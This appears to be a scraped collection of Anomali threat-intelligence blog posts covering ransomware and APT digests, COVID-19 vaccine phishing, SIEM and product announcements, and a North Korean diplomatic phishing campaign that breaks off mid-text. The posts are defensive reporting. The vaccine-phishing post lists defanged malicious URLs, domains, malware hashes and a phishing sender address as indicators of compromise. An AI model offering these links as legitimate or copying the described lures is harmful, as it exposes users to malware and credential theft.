        "date": "June 2, 2021",
        "text": "The various threat intelligence stories in this iteration of the Anomali Cyber Watch discuss the following topics:  Agrius, Conti, North Korea, JSWorm, Nobelium, Phishing, Strrat  and  Vulnerabilities . The IOCs related to these stories are attached to Anomali Cyber Watch and can be used to check your logs for potential malicious activity. \n Figure 1 - IOC Summary Charts. These charts summarize the IOCs attached to this magazine and provide a glimpse of the threats discussed. Trending Cyber News and Threat Intelligence New Sophisticated Email-based Attack From NOBELIUM (published: May 28, 2021) NOBELIUM, the threat actor behind SolarWinds attacks, has been conducting a widespread email campaign against more than 150 organizations. Using attached HTML files containing JavaScript, the email will write an ISO file to disk; this contains a Cobalt Strike beacon that will activate on completion. Once detonated, the attackers have persistent access to a victims\u2019 system for additional objectives such as data harvesting/exfiltration, monitoring, and lateral movement. \n Analyst Comment:  Be sure to update and monitor email filter rules constantly. As noted in the report, many organizations managed to block these malicious emails; however, some payloads successfully bypassed cloud security due to incorrect/poorly implemented filter rules. \n MITRE ATT&CK:    [MITRE ATT&CK] Spearphishing Link - T1192  |  [MITRE ATT&CK] Spearphishing Attachment - T1193 \n Tags:  Nobelium, SolarWinds, TearDrop, CVE-2021-1879, Government, Military Evolution of JSWorm Ransomware (published: May 25, 2021) JSWorm ransomware was discovered in 2019, and since then different variants have gained notoriety under different names such as Nemty, Nefilim, and Offwhite, among others. It has been used to target multiple industries with the largest concentration in engineering, and others including finance, healthcare, and energy. While the underlying code has been rewritten from C++ to Golang (and back again), along with revolving distribution methods, JSWorm remains a consistent threat. \n Analyst Comment:  Ransomware threats often affect organisations in two ways. First encrypting operational critical documents and data. In these cases EDR solutions will help to block potential Ransomwares and data backup solutions will help for restoring files in case an attack is successful. Secondly, sensitive customer and business files are exfiltrated and leaked online by ransomware gangs. DLP solutions will help to identify and block potential data exfiltration attempts. Whereas network segregation and encryption of critical data will play an important role in reducing the risk. \n MITRE ATT&CK:    [MITRE ATT&CK] Obfuscated Files or Information - T1027  |  [MITRE ATT&CK] Private Keys - T1145  |  [MITRE ATT&CK] Remote File Copy - T1105  |  [MITRE ATT&CK] System Owner/User Discovery - T1033  |  [MITRE ATT&CK] Code Signing - T1116  |  [MITRE ATT&CK] BITS Jobs - T1197  |  [MITRE ATT&CK] Process Injection - T1055  |  [MITRE ATT&CK] Standard Application Layer Protocol - T1071  |  [MITRE ATT&CK] Data Encrypted for Impact - T1486  |  [MITRE ATT&CK] File and Directory Discovery - T1083  |  [MITRE ATT&CK] Clipboard Data - T1115  |  [MITRE ATT&CK] Drive-by Compromise - T1189  |  [MITRE ATT&CK] Deobfuscate/Decode Files or Information - T1140 \n Tags:  JSWorm, Nemty, Offwhite, Fusion, Telegram, Nefilim, Milihpen, Gangbang, RIG Exploit Kit, Trik Botnet, EU & UK, North America, South America, Russia, China, Healthcare, Engineering, Finance, Energy Threat Actor \u2018Agrius\u2019 Emerges to Launch Wiper Attacks Against Israeli Targets (published: May 25, 2021) Cyber Operations in Israel have been carried out since mid-2020 by a threat group dubbed \u2018Agrius\u2019, targeting military and political organizations to commit espionage. The attacks look like ransomware in order to give the appearance of financial motives, but the malware was wiping systems instead. Agrius uses ProtonVPN to mask their traffic when attacking targets using \u2018Apostle\u2019 malware. Apostle has been identified as an ASPXSpy variant, which is open-source and has been used in other state-sponsored attacks. It has recently been updated to a fully-fledged ransomware tool, giving more legitimacy to the misdirection of money. \n Analyst Comment:  Defense-in-depth (layering of security mechanisms, redundancy, fail-safe defense processes) is the best way to ensure safety from APTs, including a focus on both network and host-based security. Prevention and detection capabilities should also be in place. \n MITRE ATT&CK:    [MITRE ATT&CK] Web Shell - T1100  |  [MITRE ATT&CK] Data Destruction - T1485 \n Tags:  Apostle, ASPXSpy, Agrius, Israel, Russia, Pakistan, Middle East MacOS Zero-Day Let Attackers Bypass Privacy Preferences (published: May 25, 2021) Threat actors have been leveraging vulnerabilities (CVE-2021-30663, CVE-2021-30713, CVE-2021-30665) within MacOS to bypass the Transparency Consent and Control framework, enabling them to control which resources are accessible. This allowed for the theft of browser cookies, enabled screenshot capabilities, and access the system disk without the user being aware. Apple has released patches for the associated vulnerabilities. \n Analyst Comment:  Always make sure to keep systems up to date with the latest patches to prevent systems from being vulnerable to known exploits. \n MITRE ATT&CK:    [MITRE ATT&CK] Screen Capture - T1113  |  [MITRE ATT&CK] Code Signing - T1116 \n Tags:  XCSSET, CVE-2021-30663, CVE-2021-30713, CVE-2021-30665 North Korean Hackers Behind CryptoCore Multi-Million Dollar Heists (published: May 24, 2021) Reports from ClearSky, F-Secure, JPCERT/CC and NTT Security show that the North Korea-sponsored Lazarus group has engaged in widespread theft over the past three years. This has involved breaching cryptocurrency exchanges in the U.S., Israel, Europe, and Japan. Since 2018, the group has relied on spearphishing attacks as an initial foothold into the exchanges, which are leveraged into RAT and infostealer malware infections. The CryptoCore campaign is responsible for at least five breaches, stealing an estimated $200 million dollars. \n Analyst Comment:  If engaging in cryptocurrency exchanges, only transfer what is being traded. Keep all other funds stored offline in a hardware wallet to reduce the risk of theft by malicious actors \n MITRE ATT&CK:    [MITRE ATT&CK] Bash History - T1139  |  [MITRE ATT&CK] Remote File Copy - T1105  |  [MITRE ATT&CK] Data from Local System - T1005  |  [MITRE ATT&CK] Data Encoding - T1132  |  [MITRE ATT&CK] Exfiltration Over Command and Control Channel - T1041 \n Tags:  Lazarus, CryptoCore, CryptoMimic, EU & UK, North America, Russia, North Korea, Banking & Finance FBI identifies 16 Conti Ransomware Attacks Striking US Healthcare, First Responders (published: May 24, 2021) The Conti ransomware group has been linked to at least 16 recent attacks against healthcare organizations in the US, as well as over 400 attacks worldwide. Using open RDP (Remote Desktop Protocol) ports, stolen credentials or phishing emails, the Conti group will gain access to data and not only encrypt it, but also exfiltrate it in an effort to double-up on extortion money from affected targets. This group also attacked Ireland\u2019s Health Service Executive on May 14th and demanded $20 million in ransom to decrypt the data and prevent data leaks. \n Analyst Comment:  Ransomware becomes much less effective with proper backup and restoration strategies. These will mitigate downtime and prevent the need to payout massive sums of money for decrypters that don't work (as well as fueling the ransomware industry). If you are an organization that falls victim to ransomware, scan for infections and try to isolate the infected systems. \n MITRE ATT&CK:    [MITRE ATT&CK] Remote File Copy - T1105  |  [MITRE ATT&CK] Data from Local System - T1005  |  [MITRE ATT&CK] Data Encoding - T1132  |  [MITRE ATT&CK] Data Encrypted for Impact - T1486 \n Tags:  Conti, Cobalt Strike, Emotet, Sodinokibi, Mimikatz, Trickbot, Nefilim, EU & UK, North America, Healthcare, Military This Massive Phishing Campaign Delivers Password-Stealing Malware Disguised as Ransomware (published: May 24, 2021) Strrat, a Java-based malware, is currently being delivered a PDF document via a phishing campaign using compromised email accounts. Once the PDF is opened, a connection is made to an external IP and a RAT is downloaded and installed. The victim will see that files have a \u201c.crimson\u201d extension added to them, along with a fake ransomware message. No data is actually encrypted. The strategy is to harvest user credentials and other valuable information while the victim deals with a supposedly-encrypted hard drive. \n Analyst Comment:  Don't open attachments from unknown senders pertaining to sensitive subjects (such as finances) without first verifying through a known good communication channel. Doing so will reduce your risk of malware infection. \n MITRE ATT&CK:    [MITRE ATT&CK] Hidden Files and Directories - T1158  |  [MITRE ATT&CK] Spearphishing Attachment - T1193  |  [MITRE ATT&CK] Credential Dumping - T1003  |  [MITRE ATT&CK] Query Registry - T1012  |  [MITRE ATT&CK] File and Directory Discovery - T1083  |  [MITRE ATT&CK] Clipboard Data - T1115 \n Tags:  Strrat, Phishing, Infostealer, Ransomware, Banking & Finance, Military \n\t",

        "title": "Threat Actors Capitalize on COVID-19 Vaccine News to Run Campaigns, AWS Abused to Host Malicious PDFs",
        "author": "Anomali Threat Research",
        "date": "February 2, 2021",
        "text": "Key Findings Malicious actors have targeted the vaccine supply chain and leaked materials stolen from the European Medicines Agency (EMA). Phishing campaigns have evolved alongside the pandemic, with the latest observed themes being vaccine-related topics. Users should remain cautious of possible phishing attacks via email, text messages (SMS), or just click through search results. Overview Threat actors change and adapt their campaigns to mirror themes prevalent in the public eye. When they leverage high-urgency trends, their success levels rise. Since the beginning of the pandemic, Anomali has focused resources to detect malicious cyber campaigns using COVID-19 themes. In this blog, Anomali Threat Research presents several malicious samples that represent simple tactics, techniques, and procedures (TTPs) used by actors in COVID-themed malspam campaigns. Less-sophisticated threat actors can be easier to monitor and block if the TTPs utilized by the actors are well known. New Discoveries The majority of this research centers on analysis of known threat actors and indicators of compromise (IOCs). There are several samples that we believe are newly discovered by our researchers (we haven\u2019t seen them discussed elsewhere). Among these are several malicious PDFs hosted on Amazon Web Services (AWS) and other hosting websites. We discuss this campaign below in the chapter named \u201c2.c. Alternative channel: Online PDF Search Engine Optimization (SEO)\u201d, detailing samples with titles \u201cAdenovirus vector pdf\u201d and \u201cIllinois coronavirus october 15\u201d. Details 1. Targeted Supply Chain Attacks On December 28, 2020, the US Treasury Department's Financial Crimes Enforcement Network (FinCEN) published a notice entitled, \u201cCOVID-19 Vaccine-Related Scams and Cyberattacks.\u201d\u00a0 That report provided evidence of actors conducting scams asking for a fee to provide potential victims with the vaccine sooner than permitted. Furthermore, FinCEN assessed that cybercriminals will likely continue to exploit the COVID-19 pandemic to target financial institutions, vaccine delivery operations, and vaccine manufacture supply chains. FinCEN is aware of ransomware directly targeting vaccine research and has pushed for awareness of these phishing schemes luring victims with fraudulent information about COVID-19 vaccines. [1] Other threats to vaccine research have been reported by US and European intelligence agencies. In December 2020, threat actors breached the European Medicines Agency (EMA) whilst it was in the COVID-19 vaccine evaluation process. On January 12, 2021, threat actors leaked a portion of the stolen materials with regards to Pfizer/BioNTech vaccine (Figure 1). [2]  On the same day in an unrelated event, the Director of the National Counterintelligence and Security Center (NCSC), William Evanina, confirmed the existence of threats from China and Russia to disrupt the US coronavirus vaccine supply chain. [3] \nFigure 1  \u2013 Screenshot of the Files in the EMA Vaccine Breach The publication of the EMA vaccine breach on RaidForums was taken down by forum administrators only to resurface on other platforms. Later, the EMA claimed that at least some of the leaked correspondence had \u201cbeen manipulated by the perpetrators prior to publication in a way which could undermine trust in vaccines.\u201d [4] 2. Non-targeted Adoption by Phishing Campaigns Below are three examples of COVID-19 vaccine-related phishing campaigns utilizing different delivery methods: email, SMS, and search engine traffic.\u00a0 As COVID-19 vaccination is a newsworthy topic, it would be consistent with observed activity for some threat actors to switch from previously used topics to COVID-19 to increase the likelihood of tricking victims into self-infection with malware. [5] 2.a. Typical Phishing Scenario: Vaccine and DHL In December 2020, actors using the email address\u00a0 \u201csmtp-fpcoh@tomlinfuneralsupply[.]com\u201d were sending phishing emails with various topics that included: \u201c Subject: DHL shipping document. \u201d In January 2021, the same actors were detected by Proofpoint adding the COVID-19 vaccine theme to their DHL phishing (Figure 2): \u201c Subject: COVID-19 vaccine distribution- Re-confirm your delivery address. \u201d [6] \nFigure 2  - COVID-19 Vaccine DHL Phishing Email They also included, \u201c/covid_19_vaccine_delivery/\u201d in the phishing page\u2019s URL. (Figure 3) \nFigure 3  - COVID-19 Vaccine DHL Phishing Page Auto-Fills Victim\u2019s Email 2.b. Alternative channel: Smishing and NHS While phishing attempts are most commonly observed through emails another common attack vector is through SMS. In the last week of December 2020 in the United Kingdom, a phishing campaign was observed wherein targeted individuals received a phishing link in a message sent to their phones (Figure 4). [7] \nFigure 4  - Vaccine-Themed SMS with a Phishing Link The linked phishing page (uk-application-form[.]com) asked users to provide banking information under the pretense of health officials identifying a patient (Figure 5). As of the publication of this paper that website has been and remains offline. \nFigure 5  - Phishing Site Spoofing NHS and Asking for Debit/Credit Card Information 2.c. Alternative channel: Online PDF Search Engine Optimization (SEO) Threat actors use a variety of malicious documents, in addition to other methods, in attempts to distribute malware or steal information. In addition, some actors will automate the creation of malicious documents - through the scraping of news, corporate, and other websites - for relevant contextual information that increases their chances of appearing legitimate. As a part of this research, we recently analyzed a number of PDF files associated with an automated attack campaign. In this analysis, when we opened the file it displayed a basic captcha shown in Figure 6. Scrolling down the PDF, we found a blurb of text, including various popular keywords, that appeared to have been scraped off the Internet. This likely indicates the low-sophistication of the actors and process behind the file\u2019s creation. At the end of these PDF files, there were clickable links to other malicious PDFs by the same actors. Malicious files such as these PDFs have been observed in the wild on a large-scale. They are often hosted on cloud services such as Amazon Web Services or upload sites including but not limited to weebly[.]com and strikinglycdn[.]com. For example, one such PDF is talking about the \u201cclinical trial of its Ad5-based COVID-19 vaccine\u201d.\u00a0 It has md5 hash de56cbee83eafb1ee4f6ff1fa38c696e and is hosted on Amazon Web Services at hxxps://s3.amazonaws[.]com/zonivezada/adenovirus_vector.pdf (Figure 6). \nFigure 6  - Malicious \u201cAdenovirus vector\u201d PDF: Captcha-Like Prompt If the captcha image or surrounding area is clicked by a user, it triggers a URL opening and a series of conditional redirects leading to spam pages or a malware payload (Figure 7). \nFigure 7  - Redirecting to .EXE Payload The malicious PDF uses COVID-19 vaccine-related metadata: /Subject (Adenovirus vector pdf. Credit: CanSino Biologics CanSino Biologics began a clinical trial of its Ad5-based COVID-19 vaccine) And the initial observed URL before multiple redirects to the malicious executable payload was: hxxps://ttraff[.]cc/aws?keyword=adenovirus+vector+pdf Several malicious domains, URLs, and PDF hashes involved in this campaign are listed at the end of this report. Some URLs, such as traffnew[.]ru/wb?keyword=illinois%20coronavirus%20october%2015, even include vaccine keywords. Other samples utilize vaccine keywords as part of the generic scraped text in the middle of the PDF document. Recommendations\u00a0 Use caution when offered vaccine-related information or services from an unknown source Monitor for fake COVID-19-tracing apps, including those previously reported on by Anomali [8] Take extra care when a PDF MS Office document contains a captcha, as this is a strong indicator of risk within that document Emails addressed in an overly formal manner (\u201cDear Sir\u201d or \u201cDear Madam,\u201d for instance) or with language that appears to be a strained form of English should be considered suspicious Inspect the sending email address in the header to ensure the address matches with the purported sender. For example, if the name says \u201cDHL Express\u201d but the sending domain is a totally different company (smtp-fpcoh@tomlinfuneralsupply[.]com), that would be a red flag IOCs uk-application-form[.]com \nthithoal[.]com \nproductmusics[.]com \nttraff[.]cc \ntrafficel[.]ru \ntraffnew[.]ru \ncctraff[.]ru \ngettraf[.]ru hxxps://traffnew[.]ru/wb?keyword=illinois%20coronavirus%20october%2015 \nhxxps://ttraff[.]cc/aws?keyword=adenovirus+vector+pdf \nhxxp://putrajayagemilang[.]com/covid_19_vaccine_delivery/dh \nhxxp://putrajayagemilang[.]com/covid_19_vaccine_delivery/dh?lo=dmVydHJpZWJAaGVpbi5ldQ \nhxxps://robotcheckion[.]online/?p=mjtdkyjxmu5gi3bpgi4dqnru&sub1=aws&sub3=14vnqgojhe60&sub4=adenovirus+vector+pdf \nhxxps://s3.amazonaws[.]com/zonivezada/adenovirus_vector.pdf \nhxxps://situnege.weebly[.]com/uploads/1/3/4/5/134578036/jetatugatuxifu.pdf de56cbee83eafb1ee4f6ff1fa38c696e \n9e719a17220c4d93818c356acf9aac13 \n070af4c8b6dec6ec5253c217169b7fd7 \n72dc2b505d79acc243474d455388d306 \n86d64653b44668230032ce393f2a05a4 \n55482110d6874042319c01c03f872d1b \n603cecc32e58d46fb8dbe2d834ba1f25 \ncecb7a2829c0ab8abf25753058c25a99 \n88a23a328868b1515fbc9ad27d7bd674 \n24fc39e0403e0909a8135e5c3e10f85f \nd07d3c112e861fa8b7709537431d6191 \n564c70749f6541e770e8e1697bae7974 smtp-fpcoh@tomlinfuneralsupply.com For more indicators, ThreatStream users can add our custom COVID-19 dashboard: \nFigure 8  - \u00a0Adding Custom Dashboard in ThreatStream ThreatStream / Dashboard/ + Add Dashboard / Add Existing / COVID-19 Indicators / Add.

        "title": "Enhancing Your SIEM with Retrospective Analysis in Anomali Match",
        "author": "David Leslie",
        "date": "May 30, 2019",
        "text": "Introduction A breach is announced, details are released, and everyone wonders: does my organization have, or has it had, activity associated with the people or methods connected to this breach? Many organizations today can\u2019t \u00a0answer this question, as they can\u2019t perform efficient historical analysis of past events. Anomali Match provides this ability, with no impact to the SIEM. Anomali Match enhances SIEM technologies by extracting the most crucial information from SIEM data and allowing for historical searches of that data in a fraction of the time it would take to perform on a SIEM. While most SIEM solutions perform a critical role in organizations\u2019 security infrastructures, they are generally incapable of deep retrospective analysis. SIEM technologies generally do well with: Collection of raw log data for store-of-record purposes (NIST 800-53) Selective storage and indexing of data for near real-time analysis (and often cold storage for older data) Parsing of data in to fields for near real-time analysis purposes, either by human analysts, correlation rules, anomaly behavior analysis, pattern discovery or some other type of near real-time analysis and detection Matches logged activity to a limited set of basic threat intelligence indicator types such as IP\u2019s or domains Anomali Match, on the other hand: Only processes and stores fields that would be relevant in performing a deep (months or years) historical search Stores and indexes all relevant data for fast and efficient historical searches Links back to original raw logs when available Matches all current and historical log activity to all known relevant indicators, including meaningful contextual threat model data, which includes threat bulletins, incidents, actor profiles, campaigns, TTP\u2019s, and vulnerabilities Why this matters Do we have this? That\u2019s often the first question asked after a breach is publicly announced. As details around the methods and actors involved in a breach are revealed, stockpiled data can be searched to determine if the same activity has occurred internally. Sometimes. But for most organizations relying on traditional SIEM technologies, \u201cstockpiled\u201d data often consists of only the past three or six months of activity. This is a huge problem if the details of the recently-announced breach being investigated actually happened many months ago, or even as far back as a year. But what if a year or more of historical data does exist? That\u2019s great! At least, if the data was actually searchable. Most SIEM deployments store data in hot and cold storage areas, making historical searches over long periods tedious, as some data needs to be moved from cold to available. But what if a year or more of historical data is available and online? That\u2019s great! Unless an analyst needs to begin the search on Friday before leaving work just to get the results by Monday morning. Most SIEM deployments are designed for the near real-time analysis of log data. SOC analysts analyze a stream of data, perform basic searches on recent activity, and draw a conclusion, while correlation rules automatically perform near real-time analysis on the stream. This is the point and purpose of a SIEM, and most SIEM\u2019s do this quite well, but when it comes to searching all data over the previous months and years, it is cumbersome. With Anomali Match, the question can be answered in seconds. \u00a0Anomali Match is purpose-built to collect, store and rapidly retrieve a record of all internally logged activity, allowing analysts to pinpoint activity by known bad entities in a matter of seconds. Useful Things Along with extremely fast and deep historical searching, Anomali Match is also integrated with the world\u2019s largest Threat Intelligence Platform (TIP), Anomali ThreatStream. This opens the door for Anomali Match to proactively alert, in near real-time, on activity logged to known bad threats, per high fidelity intelligence from ThreatStream. Anomali Match can also integrate vulnerability data from VA tools like Qualys, allowing for risk prioritization that is based on real-world activity (matches). And by leveraging the MITRE ATT&CK framework, Anomali Match provides deep context across strategic intelligence enabling analyst to assess and respond with great efficiency. Also, various sources can be directed to Anomali Match without the need to increase SIEM storage, licensing, processing power or overall budget. Running historical searches over the weekend is a thing of the past with  Anomali Match . As an integral piece of\u00a0 Anomali , your organization will be able to answer past, current and future questions immediately, and accurately. \n",

        "text": "Andrew de Lange, Anomali\u2019s Senior Solutions Consultant in the Middle East, provides some insight into his time as Head of Intelligence and Incident Response for a major African bank. Can You Stay Focused On Cybersecurity During a Pandemic? Weekends, holidays and now most recently, panic during the Coronavirus pandemic, all of these have one thing in common for your Security Operations team. They are the times when our focus tends to shift and we let our guard down. The COVID-19 pandemic has the potential to be the most opportune time in history for cybercriminals to strike and strike effectively. As the novel coronavirus spreads and infects humans around the globe at an unprecedented rate, it is natural for organizations to place their staff\u2019s health and safety as a top priority. This includes limiting physical interaction in an office setting. I remember the days when we rigorously tested BCM (Business Continuity Management) plans, most of the time it was an irritation but in times like now, it all makes total sense. Can the security of your organization continue to function should you remove all of your soldiers from the battlefield? You can be sure of one thing, the enemy does not walk away when there is a crisis. In fact, this is when they will use your weakness against you. Every major incident I have been involved in, either occurred after business hours, on weekends or when the staff was in a \u201crelaxed\u201d state, or on a skeleton crew. If we look at the COVID-19 situation from a Threat Intelligence, and community collaboration perspective, there is a big chance that the sharing communities that exist today will not be \u201cwatching each other\u2019s backs\u201d and although this is not by choice, it leaves a potential blind spot within these communities. Anomali prides itself on being the biggest and most effective enabler of community and trust-based intelligence sharing communities through our Trusted Circles in the ThreatStream platform. And our Anomali Threat Research (ATR) team is already witnessing an increase in malicious actor activity on a global scale, these same researchers will continue to provide the highest quality intelligence to our customers, during these uncertain times. There is no doubt that the current situation will impact our lives for years to come in many ways, we are already witnessing the impact to global financial stability and stock markets, the substantial loss of life, and now the potential threat of cybercriminals ramping up activity when our focus is elsewhere. Many lessons will be learned, chances are we will wash our hands more from this point forward. Yet one thing is very evident, COVID-19 is a game-changer in the way we approach our daily lives from here on. Stay safe and try not to get distracted from what matters.\u00a0 \n\t",

        "title": "Anomali February Product Release: Moving Beyond Tactical Intelligence",
        "author": "John Callon",
        "date": "March 2, 2021",
        "text": "We are happy to announce the Anomali Product Release for February 2021. For our product and engineering teams to deliver this latest set of features and enhancements, they worked closely with our customers with a particular eye to supporting security teams in their further move beyond a reliance on tactical, technical intelligence to a holistic, threat-model-driven approach by allowing them to work with threat models like the MITRE ATT&CK framework inside Anomali ThreatStream easily and productively. A further highlight directed at augmenting collaboration across teams and with external peers, leveraging our popular Trusted Circles capabilities, is the advent of full-featured chat within the Anomali ThreatStream threat intelligence platform, while maintaining privacy controls. Enhancements in this latest release include: MITRE ATT&CK Framework Integration As a follow-up to the recent release of support for  MITRE ATT&CK  framework techniques, we\u2019ve added the ability to import content from the  MITRE ATT&CK Navigator  tool and store your framework capabilities inside ThreatStream. Users can use the MITRE capability in ThreatStream's Investigations feature to help prioritize investigative activity and decision-making, making security teams more efficient and responsive. Advanced Search Functionality for Threat Models This month we\u2019ve extended advanced search to Threat Model content in ThreatStream - providing the same flexibility and features for finding and refining content in our platform as for observable content. Users can now create advanced search queries with conditions and operators, and some additional capabilities specific to our Threat Model content, to find relevant intelligence quickly, as well as save their complex searches for future use at a click. Collaboration via Full-Featured ThreatStream Chat Customers now have the benefit of real-time, protected communication within ThreatStream for their internal teams and with Trusted Circle collaborators via the use of a full-featured chat client. With this built-in chat functionality, analysts can communicate and share tactical information as well as more strategic aspects of analysis and response quickly and easily with colleagues and peers at organizations that are members of common Trusted Circles--from inside the ThreatStream platform, where it can be easily shared and investigated. Most importantly, the collaboration remains anonymized and privacy is ensured. Clone Custom Themed Dashboards Extending the custom themed dashboards developed by the Anomali Threat Research (ATR) team and released in December, we are now offering the ability to not only access a custom themed dashboard (for COVID, Sunburst or other specific themes), but also to clone (or create a copy) of that dashboard, which you can now further customize or tailor to your specific needs and preferences. Once a dashboard is cloned a user can change, for a given widget, the saved query upon which the widget is based, as well as add their own custom widgets. Intelligence Enrichment Inside of Investigations We continue to refine the display of critical information to the user at the appropriate point of their research in order to ensure analysts have the right intelligence at the right time and are able to perform their tasks quickly and easily. With this release analysts can now view enrichment details from the Investigations graph, further saving effort and shortening response times. Users will rarely have to navigate away from the page to gain more context about an Investigation entity. In addition to this, analysts are now able to view enrichment output for multiple indicators found during their investigation from the same view, allowing comparison of content and simplifying the investigation process. These changes combine with a new enhancement to Threat Cards, a recently released feature inside the Investigations module that shows key summary information on any graph entity, to include a list of enrichments available for indicators, so that users can view that enrichment or context information from the Investigations view without having to navigate elsewhere on the platform. Other workflow enhancements requested by customers were also included in this release, like bulk indicator upload and improvements on Analyst Notes on any observable uploaded or added to an investigation. Finished Intelligence Report Distribution Control At the conclusion of an investigation, key indicators, metrics or reports are often distributed to key stakeholders, such as the security operations team or executives, by emailing a ThreatStream generated report as Finished Intelligence directly from ThreatStream. In this month\u2019s release, we\u2019ve enabled a tighter security posture regarding the distribution of this Finished Intelligence from ThreatStream, allowing organization\u2019s to restrict the domains to which that Finished Intelligence can be distributed by email. By default, organizations will continue to be able to send Finished Intelligence output to recipients on any web domain. To implement a restriction, Administrative users can just apply settings in the Organization Administration area. GreyNoise Threat Intelligence Enrichment Now Available We are excited to announce the latest threat intelligence integration into ThreatStream, with  GreyNoise  enrichment is now available for activation. GreyNoise provides context on IP behavior associated with mass-internet scanning, with data such as intent, tags, first seen, last seen, geo-data, ports, OS and JA3. ThreatStream customers can enrich against it to identify and reduce the number of such observables, leaving more time to investigate high-priority targeted attacks. \n\t",

        "title": "Suspected North Korean Cyber Espionage Campaign Targets Multiple Foreign Ministries and Think Tanks",
        "author": "Anomali Threat Research",
        "date": "August 21, 2019",
        "text": "revised on August 22, 2019 Anomali researchers recently observed a site masquerading as a login page for a diplomatic portal linked to the French government. Further analysis of the threat actor\u2019s infrastructure uncovered a broader phishing campaign targeting three different countries\u2019 Ministry of Foreign Affairs agencies. Also targeted were four research-oriented organisations including: Stanford University, the Royal United Services Institute (RUSI), a United Kingdom-based think tank, Congressional Research Service (CRS), a United States-based think tank, and five different email service providers. There is an overlap of infrastructure with known North Korean actors, including the same domain and shared hosting provider. Because of the links between one of the victims and their work on North Korean sanctions, we expect to see malicious actors continue to target the international staff involved in a similar official capacity. Prior to the release of this blog post, we have submitted the phishing sites to Google Safebrowsing and Microsoft for blacklist consideration. Targeting of French Ministry of Europe and Foreign Affairs On August 9, 2019, The Anomali Threat Research Team discovered a web page impersonating the French Ministry for Europe and Foreign Affairs (MEAE) online portal. The malicious host \u201cportalis.diplomatie.gouv.fr.doc-view[.]work\u201d [1]  bears a strong resemblance to the legitimate site \u201cdiplomatie.gouv.fr\u201d. When navigating to the suspicious subdomain, users are displayed with a phishing site mimicking the MEAE portal. According to the legitimate site, access is restricted to \u201cMEAE agents\u201d. The legitimate website for \u201cFrance Diplomatie\u201d, describes MEAE agents as potentially working for one of 12 agencies for the \u201cMinistry for Europe and Foreign Affairs\u201d. If an official from any of these agencies is able to login to the portal, then it is possible that all twelve of these agencies are potential victims, which includes: Agence Fran\u00e7aise de D\u00e9veloppement (AFD) Agency for French Education Abroad (AEFE) Agricultural Research Centre for International Development (CIRAD) Atout France Business France Campus France and France M\u00e9dias Monde Canal France International (CFI) Expertise France France Volontaires Institut Fran\u00e7ais Research Institute for Development (IRD) \nFigure 1 - Faux login page for the portal of the Ministry of Europe and Foreign Affairs (MEAE) The screenshot above shows the webpage designed to look like the MEAE portal. The screenshot shows a session timeout popup window for the victim who has attempted to login. In this instance, although not visibly clear, the page source shows the intended victim. This person was most likely targeted in a phishing campaign. \nFigure 2 - Page source code for MEAE portal and victim email address The email in the page source code is for an employee of the target organisation. According to delegefrance[.]org, the email address in the page source code belongs to a senior official assigned to the French Mission Team to the United Nations in New York. Moreover, this French diplomat works in the \u201cDisarmament, Non-Proliferation, Sanctions committees: Iran, North Korea, 1st Committee\u201d. [2] Threat Infrastructure Analysis The malicious URL \u201cportalis.diplomatie.gouv.fr.doc-view[.]work\u201d is mimicking a diplomatic portal on the malicious domain \u201cdoc-view[.]work\u201d. This domain is hosted on the IP 157.7.184[.]15 and has several subdomains that appear to be designed to impersonate email providers. The IP address also appears to have several similar domains and URLs that share some patterns in naming conventions. \nFigure 3 - Similar named domains hosted on the same IP address The IP address 157.7.184[.]15 is hosted by the Asia Pacific Network Information Centre (APNIC). There are multiple unrelated domains hosted on the same IP address because the IP address is shared. The IP is based in Japan and registered under the Japan Network Information Centre located in Tokyo. The most recently used domains on this IP address that share the same naming conventions are the following four domains: Domain 1 - doc-view[.]work The domain doc-view[.]work is hosted on IP 157.7.184[.]15. The domain has 32 subdomains. [3]  Most of the subdomains appear to be spoofing email service providers Yahoo, Outlook, Ymail and Google services. Both the domain and some of the subdomains appear to have been set up to look like they will allow the victim to access documents; the use of Microsoft OneDrive for example. \nFigure 4 - An overview of high profile phishing sites on domain doc-view[.]work Figure 4 above depicts the most interesting subdomains created for the domain doc-view[.]work to include two subdomains set up to impersonate the MEAE login. We also identified a subdomain \u201csecuremail.stanford.doc-view[.]work\u201d created by the malicious actor to mimic Stanford University\u2019s Secure Email service. [4]  According to Stanford University IT Department\u2019s website, the Secure Email service is designed for faculty and staff who need to use email to send moderate or high risk data. Of note, Stanford University hosts the Centre for International Security and Cooperation (CISAC) and the Asia Pacific Research Centre (APARC) - both of which are part of the Freeman Spogli Institute for International Studies. These research centres host a number of talks and deliver research on a variety of international issues including ongoing developments in North Korea. \nFigure 5 - Screenshot of Stanford University\u2019s Secure Email-themed phishing site securemail.stanford.doc-view[.]work The submitted URL in URLScan.io, an online service for scanning and analyzing websites, shows the potential victim in the screenshot available, confirms the target institute as being Stanford University. A search in the Stanford Directory did not reveal anyone associated with this email address at Stanford University. When investigating SSL/TLS certificates issued for the domain doc-view[.]work, there were five other fraudulent subdomains spoofing two think tanks, two foreign government agencies, and a United Nations organization. Congressional Research Service, a United States-based think tank Ministry of Foreign and European Affairs of the Slovak Republic Ministry of Foreign Affairs - Unknown country Royal United Services Institute (RUSI), a United Kingdom-based think tank South African Department of International Relations and Cooperation United Nations delegation Domain 2. app-support[.]work The domain app-support[.]work is hosted on the same IP address 157.7.184[.]15. The domain has a number of subdomains that look like they are attempting to impersonate popular email providers such as Yahoo and Gmail. The use of the domain \u201capp-support\u201d suggests the campaigns associated with this domain may be targeting smart-phones or Apple devices, because of the use of the word \u201capp\u201d. \nFigure 6 - An overview of phishing sites associated with the domain app-support[.]work High profile targets in the above diagram include: Sina - A Chinese technology company Domain 3. web-line[.]work The domain web-line[.]work is hosted on the IP 157.7.184[.]15. The domain has a number of subdomains that appear to be mimicking well-known online services such as Google\u2019s Gmail and Microsoft\u2019s OneDrive. Interestingly, the domain owner also created a seemingly identical MEAE-themed subdomain \u201cportalis.diplomatie.gouv.web-line[.]work\u201d that presumably attempts to mimic the MEAE portal. At the time of this report, the website was unresponsive; therefore, we were unable to obtain a screenshot of the page or analyze the site\u2019s source code. Due to the domain name and infrastructure similarities of the original discovery, we judge with moderate confidence that the second subdomain was most likely created to target MEAE using the same techniques discussed above. \nFigure 7 - An overview of phishing sites associated with the domain web-line[.]work In Figure 7, we highlight several high profile organizations targeted by the attackers. The following list reflects the most interesting targets in the overview of subdomains: Mail.fed.be - possible attempt to target the Federal government of Belgium Ministry of Europe and Foreign Affairs - France (MEAE) Ministry of Foreign Affairs (MOFA) - unknown country Sina - a Chinese technology company The Department of International Relations and Cooperation - The foreign ministry of the South African government Domain 4. sub-state[.]work When 